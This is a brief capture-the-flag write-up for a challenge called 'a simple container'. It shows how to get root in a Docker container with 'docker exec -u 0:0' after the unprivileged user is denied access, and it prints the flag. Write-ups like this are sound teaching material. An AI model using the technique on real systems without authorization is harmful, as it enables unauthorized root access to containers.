# A simple container
### Information:
- web shell

There is 2 user:
- user
- admin

In `/home/admin` there is a docker-compose.yml

```yaml
user@main-75dcb7f9db-xqgb6:/home/admin$ cat docker-compose.yml 
services:
  app:
    image: app
```

```bash
user@main-75dcb7f9db-xqgb6:/home/admin$ docker exec -it 7f883 /bin/sh
$ whoami
player
$ cd /
bin  boot  dev  etc  flag.txt  home  lib  lib32  lib64  libx32  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
$ cat flag.txt
cat: flag.txt: Permission denied
```
Just get back in it with `UID: 0 GID: 0` for `root`

```bash
user@main-75dcb7f9db-xqgb6:/home/admin$ docker exec -it -u 0:0 7f883 /bin/sh
# whoami
root
# cd /
# ls
bin  boot  dev  etc  flag.txt  home  lib  lib32  lib64  libx32  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
# cat flag.txt
4T${SIMPLE_is_VERy_$1mple_aM_i_r1ght}
```

There it is, it was `a simple container`


